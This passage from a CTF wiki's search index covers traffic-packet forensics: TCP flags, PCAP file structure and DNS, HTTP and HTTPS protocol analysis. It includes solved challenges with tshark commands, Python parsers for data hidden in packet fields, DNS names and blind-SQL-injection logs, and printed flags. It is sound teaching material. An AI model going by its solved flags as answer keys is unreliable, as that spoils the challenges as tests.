aborts a connection due to errors, then the connection must be released and re-established. SYN: Synchronous bit. When SYN=1, it means the packet is making an initiation request to connect. Usually, the packet with the SYN flag means the client is trying to make a connection to the server. FIN: Final bit. When FIN=1, it means to release or close a connection. Extract the tcp.urg (Urgent pointer in the image above) with tshark, then remove the 0 field and replace the newline with , . Use Python to convert the numbers into ASCII to get the flag. tshark -r stego.pcap -T fields -e tcp.urgent_pointer | egrep -vi \"^0 $ \" | tr '\\n' ',' 67 ,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125 Use Python to convert to ASCII: arr = [ 67 , 84 , 70 , 123 , 65 , 110 , 100 , 95 , 89 , 111 , 117 , 95 , 84 , 104 , 111 , 117 , 103 , 104 , 116 , 95 , 73 , 116 , 95 , 87 , 97 , 115 , 95 , 73 , 110 , 95 , 84 , 104 , 101 , 95 , 80 , 105 , 99 , 116 , 117 , 114 , 101 , 125 ] print ( \"\" . join ([ chr ( x ) for x in arr ])) Flag: CTF{And_You_Thought_It_Was_In_The_Picture} Related CTF Challenges \u00b6 HITCON-2018 - ev3 basic HITCON-2018 - ev3 scanner","title":"Data Extraction"},{"location":"misc/traffic/data/#wireshark","text":"Wireshark automatic extraction: file -> export objects -> http Manual data extraction: file->export selected Packet Bytes","title":"Wireshark"},{"location":"misc/traffic/data/#tshark","text":"As a command-line version of wireshark, tshark is an efficient and fast. It can be used flexibly with other command-line tools ( awk , grep ) to quickly locate and extract data, thus eliminating the need for complicated scripting.","title":"tshark"},{"location":"misc/traffic/data/#common-methods","text":"tshark -r **.pcap \u2013Y ** -T fields \u2013e ** | **** > data Usage: -Y <display filter> packet displaY filter in Wireshark display filter syntax -T pdml | ps | psml | json | jsonraw | ek | tabs | text | fields | ? format of text output (def: text) -e <field> field to print if -Tfields selected (e.g. tcp.port, _ws.col.Info) Passing the -Y option allows you to apply display filters (same filter as Wireshark), then -T fields -e will let to extract specific fields (such as usb.capdata ). Tips If you are not sure about the field name, you can right-click on the field in Wireshark of a packet, then Apply as Filter \u2192 Selected. You should then see the field name in the filter bar.","title":"Common Methods"},{"location":"misc/traffic/data/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/traffic/data/#google-ctf-2016-a-cute-stegosaurus","text":"Download the challenge here The data was hidden very cleverly. There was an image, but it's a rabbit hole and caused a lot of confusion. For this challenge, you need to be familiar with the tcp protocol. There are 6 bits of status code in the TCP message segment: URG: Urgent bit. When URG=1, it means the packet is an urgent packet. It tells the system that there is urgent data in this segment and that it should be sent as soon as possible (equivalent to high-priority data) ACK: Acknowledge bit. When ACK=1, it means the packet is an acknowledgment packet. When ACK=0, the packet is not an acknowledgment packet. The server acknowledges data is received by sending ACK=1 to the sender or client. PSH: Push bit. When PSH=1, it means the other party asks the packets in the buffer to be sent immediately, without waiting for the buffer to be full. RST: Reset bit. When RST=1, it means to aborts a connection due to errors, then the connection must be released and re-established. SYN: Synchronous bit. When SYN=1, it means the packet is making an initiation request to connect. Usually, the packet with the SYN flag means the client is trying to make a connection to the server. FIN: Final bit. When FIN=1, it means to release or close a connection. Extract the tcp.urg (Urgent pointer in the image above) with tshark, then remove the 0 field and replace the newline with , . Use Python to convert the numbers into ASCII to get the flag. tshark -r stego.pcap -T fields -e tcp.urgent_pointer | egrep -vi \"^0 $ \" | tr '\\n' ',' 67 ,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125 Use Python to convert to ASCII: arr = [ 67 , 84 , 70 , 123 , 65 , 110 , 100 , 95 , 89 , 111 , 117 , 95 , 84 , 104 , 111 , 117 , 103 , 104 , 116 , 95 , 73 , 116 , 95 , 87 , 97 , 115 , 95 , 73 , 110 , 95 , 84 , 104 , 101 , 95 , 80 , 105 , 99 , 116 , 117 , 114 , 101 , 125 ] print ( \"\" . join ([ chr ( x ) for x in arr ])) Flag: CTF{And_You_Thought_It_Was_In_The_Picture}","title":"Google CTF 2016 - a cute stegosaurus"},{"location":"misc/traffic/data/#related-ctf-challenges","text":"HITCON-2018 - ev3 basic HITCON-2018 - ev3 scanner","title":"Related CTF Challenges"},{"location":"misc/traffic/fix/","text":"PCAP File Structure \u00b6 In general, there are few investigations about the PCAP file format, and usually can be directly repaired by means of off-the-shelf tools such as pcapfix . Tools PcapFix Online PcapFix General file structure: 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Type | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Block Body / / /* variable length, aligned to 32 bits */ / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ The common block types defined are: Section Header Block: it defines the most important characteristics of the capture file. Interface Description Block: it defines the most important characteristics of the interface(s) used for capturing traffic. Packet Block: it contains a single captured packet or a portion of it. Simple Packet Block: it contains a single captured packet, or a portion of it, with only a minimal set of information about it. Name Resolution Block: it defines the mapping from numeric addresses present in the packet dump and the canonical name counterpart. Capture Statistics Block: it defines how to store some statistical data (e.g. packet dropped, etc) which can be useful to understand the conditions in which the capture has been made. Common Blocks \u00b6 Section Header Block \u00b6 Must exist, indicating the beginning of the file. 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Byte-Order Magic (0x1A2B3C4D) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Major Version | Minor Version | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | | Section Length | | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / / / Options (variable) / / / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Interface Description Block \u00b6 Must exist, describe interface characteristics 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | LinkType | Reserved | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | SnapLen(Amount of Data per Frame) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / / / Options (variable) / / / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Packet Block \u00b6 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Interface ID | Drops Count | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Timestamp (High) In Unix Format | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Timestamp (Low) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Captured Len | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Packet Len | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Packet Data / / /* variable length, aligned to 32 bits */ / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Options (variable) / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ CTF Example \u00b6 Baidu Cup - Find the Flag \u00b6 Download the challenge here First, the challenge title Find the Flag hints that we must find the string contains flag . First step, search for flag string We will search for flag string with the strings command. Windows users can use the search function of notepad++ . The search command: strings findtheflag.cap | grep flag We found out that a lot of matched strings, but it's not what we looking for. Step 2, Repair the Traffic Packets File We opened this PCAP file with wireshark However, it displayed an error message and seems corrupted, so we need to fix it. We used this online tool to helps us quickly fix its PCAP file: http://f00l.de/hacking/pcapfix.php After the repair is complete, click Get your repaired PCAP-file here. to download the repaired PCAP file, then open it with wireshark . Since we still have to find the flag , we will analyze traffics with wireshark . Step 3, Follow the TCP Streams Let's follow the TCP Streams and see if there is anything interesting? By following the TCP streams, we found some version information, cookie, etc. We still found something interesting. From tcp.stream eq 29 to tcp.stream eq 41 , they show the words where is the flag? . Is it hinting the flag is here? Step 4, Find the grouped byte stream When we follow tcp.stream eq 29 , we saw lf in the Identification message. We can continue to follow the next stream, Identification in tcp.stream eq 30 we see ga . We discovered that corresponding Identification fields in the two packets when combined from right to left, becomes flag ! So we can guess the flag is inside the Identification fields. We can find the remaining parts of the flag by using the search by strings feature in wireshark . Edit \u2192 Find Packet \u2192 Select Packet bytes \u2192 Select Narrow & Wide \u2192 Select String, then enter flag in search field. Here are the screenshots of the search: So the final flag is: flag{aha!_you_found_it!} References \u00b6 http://www.tcpdump.org/pcap/pcap.html https://zhuanlan.zhihu.com/p/27470338 https://www.cnblogs.com/ECJTUACM-873284962/p/9884447.html","title":"PCAP File Repairing"},{"location":"misc/traffic/fix/#pcap-file-structure","text":"In general, there are few investigations about the PCAP file format, and usually can be directly repaired by means of off-the-shelf tools such as pcapfix . Tools PcapFix Online PcapFix General file structure: 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Type | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Block Body / / /* variable length, aligned to 32 bits */ / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Block Total Length | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ The common block types defined are: Section Header Block: it defines the most important characteristics of the capture file. Interface Description Block: it defines the most important characteristics of the interface(s) used for capturing traffic. Packet Block: it contains a single captured packet or a portion of it. Simple Packet Block: it contains a single captured packet, or a portion of it, with only a minimal set of information about it. Name Resolution Block: it defines the mapping from numeric addresses present in the packet dump and the canonical name counterpart. Capture Statistics Block: it defines how to store some statistical data (e.g. packet dropped, etc) which can be useful to understand the conditions in which the capture has been made.","title":"PCAP File Structure"},{"location":"misc/traffic/fix/#common-blocks","text":"","title":"Common Blocks"},{"location":"misc/traffic/fix/#section-header-block","text":"Must exist, indicating the beginning of the file. 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Byte-Order Magic (0x1A2B3C4D) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Major Version | Minor Version | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | | Section Length | | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / / / Options (variable) / / / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"Section Header Block"},{"location":"misc/traffic/fix/#interface-description-block","text":"Must exist, describe interface characteristics 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | LinkType | Reserved | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | SnapLen(Amount of Data per Frame) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / / / Options (variable) / / / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"Interface Description Block"},{"location":"misc/traffic/fix/#packet-block","text":"0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Interface ID | Drops Count | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Timestamp (High) In Unix Format | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Timestamp (Low) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Captured Len | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Packet Len | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Packet Data / / /* variable length, aligned to 32 bits */ / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ / Options (variable) / +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"Packet Block"},{"location":"misc/traffic/fix/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/traffic/fix/#baidu-cup-find-the-flag","text":"Download the challenge here First, the challenge title Find the Flag hints that we must find the string contains flag . First step, search for flag string We will search for flag string with the strings command. Windows users can use the search function of notepad++ . The search command: strings findtheflag.cap | grep flag We found out that a lot of matched strings, but it's not what we looking for. Step 2, Repair the Traffic Packets File We opened this PCAP file with wireshark However, it displayed an error message and seems corrupted, so we need to fix it. We used this online tool to helps us quickly fix its PCAP file: http://f00l.de/hacking/pcapfix.php After the repair is complete, click Get your repaired PCAP-file here. to download the repaired PCAP file, then open it with wireshark . Since we still have to find the flag , we will analyze traffics with wireshark . Step 3, Follow the TCP Streams Let's follow the TCP Streams and see if there is anything interesting? By following the TCP streams, we found some version information, cookie, etc. We still found something interesting. From tcp.stream eq 29 to tcp.stream eq 41 , they show the words where is the flag? . Is it hinting the flag is here? Step 4, Find the grouped byte stream When we follow tcp.stream eq 29 , we saw lf in the Identification message. We can continue to follow the next stream, Identification in tcp.stream eq 30 we see ga . We discovered that corresponding Identification fields in the two packets when combined from right to left, becomes flag ! So we can guess the flag is inside the Identification fields. We can find the remaining parts of the flag by using the search by strings feature in wireshark . Edit \u2192 Find Packet \u2192 Select Packet bytes \u2192 Select Narrow & Wide \u2192 Select String, then enter flag in search field. Here are the screenshots of the search: So the final flag is: flag{aha!_you_found_it!}","title":"Baidu Cup - Find the Flag"},{"location":"misc/traffic/fix/#references","text":"http://www.tcpdump.org/pcap/pcap.html https://zhuanlan.zhihu.com/p/27470338 https://www.cnblogs.com/ECJTUACM-873284962/p/9884447.html","title":"References"},{"location":"misc/traffic/introduction/","text":"In CTFs, analyzing traffic packets is an important part of performing an investigation. Often the competition will provide a traffic packets PCAP file, where players need to repair or rebuild the files transferred in the PCAP file to perform analysis. PCAP is the key research direction, the complication is that the packets are filled with a lot of irrelevant traffics, so filter out the irrelevant traffics will be necessary. Overall, there are the following steps: Overall Grasp Agreement Rating Endpoint Statistics Filter Relevant Information Filter Syntax Host, Protocol, Contains, Flags Find Exceptions Special Strings A Protocol Field Flag Located On The Server Data Extraction Strings Extraction Files Extraction In general, CTF traffic packets analysis falls into these 3 categories: Repair Traffic Packet (PCAP) File Protocol Analysis Data Extraction","title":"Introduction to Traffic Packet Analysis"},{"location":"misc/traffic/protocols/","text":"A network protocol is an established set of rules that determine how data is transmitted between different devices in the same network. Essentially, it allows connected devices to communicate with each other, regardless of any differences in their internal processes, structure, or design. Network protocols are the reason you can easily communicate with people all over the world, and thus play a critical role in modern digital communications. In this selection on protocol analysis, we will cover the following: Wireshark Common Features HTTP Protocol Analysis HTTPS Protocol Analysis FTP Protocol Analysis DNS Protocol Analysis WIFI Protocol Analysis USB Protocol Analysis","title":"Overview of Protocol Analysis"},{"location":"misc/traffic/protocols/DNS/","text":"DNS \u00b6 DNS uses UDP protocol. Message format: +----------------------------------------------------------+ | Message Header | +----------------------------------------------------------+ | Question (record of a query to the server) | +----------------------------------------------------------+ | Answer (record of server reply) | +----------------------------------------------------------+ | Authorization (NS record for authoritative zone servers) | +----------------------------------------------------------+ | Additional (additional useful information) | +----------------------------------------------------------+ The query packet only has two parts: the header and the question. After receiving the query packet, DNS parses answer information, the authorized organization, the additional resource record according to the query information, and modify the relevant identification of the header and then return it to the client. The query header has a fixed length of 12 bytes and contains the query/reply packet information in the following format: 1 1 1 1 1 1 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ID | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ |QR| Opcode |AA|TC|RD|RA| Z | RCODE | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QDCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ANCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | NSCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ARCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ ID : ID set by the client, the reply message must have the same id to distinguish which query the reply message belongs to. QR : Indicates if the message is a query (0) or a reply (1). AA : Authoritative Answer, in a response, indicates if the DNS server is authoritative for the queried hostname. TC : Truncation, indicates that this message was truncated due to excessive length. RD : Recursion Desired, indicates if the client means a recursive query. RA : Recursion Available, in a response, indicates if the replying DNS server supports recursion. Z : Zero, reserved for future use. RCODE : Response code, can be NOERROR (0), FORMERR (1, Format error), SERVFAIL (2), NXDOMAIN (3, Nonexistent domain)... Every question selection format: 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | | / QNAME / / / +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QTYPE | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QCLASS | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ QNAME : Name of the requested resource. QTYPE : Type of RR (A, AAAA, MX, TXT, etc.). QCLASS : Class code. CTF Example \u00b6 BSides San Francisco CTF 2017 - dnscap \u00b6 Download the PCAP file here We opened the PCAP file in Wireshark and found all the traffics is using the DNS protocol. There are many bytes in the DNS query domain name. We can use this Regex to find all the requested domain names: ([\\w\\.]+)\\.skullseclabs\\.org Remove the rest of the fields in qry.name , leaving only data part, thus merging the data, then retrieving 89504e.....6082 in hex. Note Run this script in Python2 import re find = [] with open ( 'hex' , 'rb' ) as f : for i in f : text = re . findall ( r '([\\w\\.]+)\\.skull' , i ) if text : tmp = text [ 0 ] . replace ( '.' , '' ) find . append ( tmp [ 18 :]) last = [] for i in find : if i not in last : last . append ( i ) print '' . join ( last ) Now, convert the hex to file and then extract the png file from it. Using CyberChef to convert and extract the file, we got the flag. Flag: Related CTF Challenges \u00b6 IceCTF-2016:Search EIS-2017:DNS 101 References \u00b6 https://github.com/lisijie/homepage/blob/master/posts/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md https://xpnsec.tumblr.com/post/157479786806/bsidessf-ctf-dnscap-walkthrough","title":"DNS"},{"location":"misc/traffic/protocols/DNS/#dns","text":"DNS uses UDP protocol. Message format: +----------------------------------------------------------+ | Message Header | +----------------------------------------------------------+ | Question (record of a query to the server) | +----------------------------------------------------------+ | Answer (record of server reply) | +----------------------------------------------------------+ | Authorization (NS record for authoritative zone servers) | +----------------------------------------------------------+ | Additional (additional useful information) | +----------------------------------------------------------+ The query packet only has two parts: the header and the question. After receiving the query packet, DNS parses answer information, the authorized organization, the additional resource record according to the query information, and modify the relevant identification of the header and then return it to the client. The query header has a fixed length of 12 bytes and contains the query/reply packet information in the following format: 1 1 1 1 1 1 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ID | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ |QR| Opcode |AA|TC|RD|RA| Z | RCODE | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QDCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ANCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | NSCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | ARCOUNT | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ ID : ID set by the client, the reply message must have the same id to distinguish which query the reply message belongs to. QR : Indicates if the message is a query (0) or a reply (1). AA : Authoritative Answer, in a response, indicates if the DNS server is authoritative for the queried hostname. TC : Truncation, indicates that this message was truncated due to excessive length. RD : Recursion Desired, indicates if the client means a recursive query. RA : Recursion Available, in a response, indicates if the replying DNS server supports recursion. Z : Zero, reserved for future use. RCODE : Response code, can be NOERROR (0), FORMERR (1, Format error), SERVFAIL (2), NXDOMAIN (3, Nonexistent domain)... Every question selection format: 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | | / QNAME / / / +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QTYPE | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ | QCLASS | +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+ QNAME : Name of the requested resource. QTYPE : Type of RR (A, AAAA, MX, TXT, etc.). QCLASS : Class code.","title":"DNS"},{"location":"misc/traffic/protocols/DNS/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/traffic/protocols/DNS/#bsides-san-francisco-ctf-2017-dnscap","text":"Download the PCAP file here We opened the PCAP file in Wireshark and found all the traffics is using the DNS protocol. There are many bytes in the DNS query domain name. We can use this Regex to find all the requested domain names: ([\\w\\.]+)\\.skullseclabs\\.org Remove the rest of the fields in qry.name , leaving only data part, thus merging the data, then retrieving 89504e.....6082 in hex. Note Run this script in Python2 import re find = [] with open ( 'hex' , 'rb' ) as f : for i in f : text = re . findall ( r '([\\w\\.]+)\\.skull' , i ) if text : tmp = text [ 0 ] . replace ( '.' , '' ) find . append ( tmp [ 18 :]) last = [] for i in find : if i not in last : last . append ( i ) print '' . join ( last ) Now, convert the hex to file and then extract the png file from it. Using CyberChef to convert and extract the file, we got the flag. Flag:","title":"BSides San Francisco CTF 2017 - dnscap"},{"location":"misc/traffic/protocols/DNS/#related-ctf-challenges","text":"IceCTF-2016:Search EIS-2017:DNS 101","title":"Related CTF Challenges"},{"location":"misc/traffic/protocols/DNS/#references","text":"https://github.com/lisijie/homepage/blob/master/posts/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md https://xpnsec.tumblr.com/post/157479786806/bsidessf-ctf-dnscap-walkthrough","title":"References"},{"location":"misc/traffic/protocols/FTP/","text":"FTP \u00b6 FTP (File Transfer Protocol) is one of the protocols in the TCP/IP Protocol group. The FTP protocol consists of two parts, the FTP server, and the FTP client. The FTP server is used to store the files, and the user can use the FTP client to access the resources located on the FTP server through the FTP protocol. When developing a website, the FTP protocol is usually used to upload web pages or programs to the Web server. In addition, because the FTP transfer rate is quite fast, it\u2019s commonly used for transferring large files over the network. By default, the FTP protocol uses TCP ports 20 and 21. Port 20 is for transmitting data, and port 21 for transmitting commands. However, the data transfer port depends on the transfer mode used by FTP. If active mode is used, then the data transfer port is 20 used. If passive mode is enabled, the specific port used can be decided by the server and the client.","title":"FTP"},{"location":"misc/traffic/protocols/FTP/#ftp","text":"FTP (File Transfer Protocol) is one of the protocols in the TCP/IP Protocol group. The FTP protocol consists of two parts, the FTP server, and the FTP client. The FTP server is used to store the files, and the user can use the FTP client to access the resources located on the FTP server through the FTP protocol. When developing a website, the FTP protocol is usually used to upload web pages or programs to the Web server. In addition, because the FTP transfer rate is quite fast, it\u2019s commonly used for transferring large files over the network. By default, the FTP protocol uses TCP ports 20 and 21. Port 20 is for transmitting data, and port 21 for transmitting commands. However, the data transfer port depends on the transfer mode used by FTP. If active mode is used, then the data transfer port is 20 used. If passive mode is enabled, the specific port used can be decided by the server and the client.","title":"FTP"},{"location":"misc/traffic/protocols/HTTP/","text":"HTTP \u00b6 HTTP (Hyper Text Transfer Protocol) is an application layer protocol for distributed, collaborative, and hypermedia information systems. HTTP is the foundation of data communication for the World Wide Web, where hypertext documents include hyperlinks to other resources that the user can easily access, for example by a mouse click or by tapping the screen in a web browser. CTF Example \u00b6 Jiangsu Province Navigator Cup - 2017: hack \u00b6 Download the challenge here These observations can be drawn: HTTP is used 102.168.173.134 is the client No attachments exist From this picture, we can see blind SQL injection is in traffic packets. At this point, you can determine the direction to obtain the flag: extracting all the URLs, then use Python . Extract URLs: tshark -r hack.pcap -T fields -e http.request.full_uri|tr -s '\\n' | grep flag > log Parse blind SQL injection requests import re with open ( 'log' ) as f : tmp = f . read () flag = '' data = re . findall ( r '=(\\d*)%23' , tmp ) data = [( int ( i )) for i in data ] for i , num in enumerate ( data ): try : if num > data [ i + 1 ]: flag += chr ( num ) except Exception : pass print ( flag )","title":"HTTP"},{"location":"misc/traffic/protocols/HTTP/#http","text":"HTTP (Hyper Text Transfer Protocol) is an application layer protocol for distributed, collaborative, and hypermedia information systems. HTTP is the foundation of data communication for the World Wide Web, where hypertext documents include hyperlinks to other resources that the user can easily access, for example by a mouse click or by tapping the screen in a web browser.","title":"HTTP"},{"location":"misc/traffic/protocols/HTTP/#ctf-example","text":"","title":"CTF Example"},{"location":"misc/traffic/protocols/HTTP/#jiangsu-province-navigator-cup-2017-hack","text":"Download the challenge here These observations can be drawn: HTTP is used 102.168.173.134 is the client No attachments exist From this picture, we can see blind SQL injection is in traffic packets. At this point, you can determine the direction to obtain the flag: extracting all the URLs, then use Python . Extract URLs: tshark -r hack.pcap -T fields -e http.request.full_uri|tr -s '\\n' | grep flag > log Parse blind SQL injection requests import re with open ( 'log' ) as f : tmp = f . read () flag = '' data = re . findall ( r '=(\\d*)%23' , tmp ) data = [( int ( i )) for i in data ] for i , num in enumerate ( data ): try : if num > data [ i + 1 ]: flag += chr ( num ) except Exception : pass print ( flag )","title":"Jiangsu Province Navigator Cup - 2017: hack"},{"location":"misc/traffic/protocols/HTTPS/","text":"HTTPS \u00b6 HTTPs = HTTP + SSL / TLS . In HTTPS, the communication protocol is encrypted using Transport Layer Security (TLS) or, formerly, Secure Sockets Layer (SSL). The protocol is therefore also referred to as HTTP over TLS, or HTTP over SSL. CTF Example \u00b6 hack-dat-kiwi-ctf-2015: ssl-sniff-2 \u00b6 Download the challenge files here Open the PCAP file in Wireshark, you will find TLS encrypted data. We are given the server.key.insecure key, so we need to import that key in order to decrypt the packets. There are two ways to get to the TLS Preferences page: Edit --> Preferences --> Protocols --> TLS Right click on a TSL packet --> Transport Layer Security --> Open Transport Layer Security preferences After you get to the TLS Preferences page, click on Edit... next to the RSA keys list. Then, add the server.key.insecure file to Key File and hit OK . Now, you can see the decrypted packets. You will find the flag in the HTTP packets.","title":"HTTPS"},{"location":"misc/traffic/protocols/HTTPS/#https","text":"HTTPs = HTTP + SSL / TLS . In HTTPS, the communication protocol is encrypted using Transport Layer Security (TLS) or, formerly, Secure Sockets Layer (SSL). The protocol is therefore also referred to as HTTP over TLS, or HTTP over 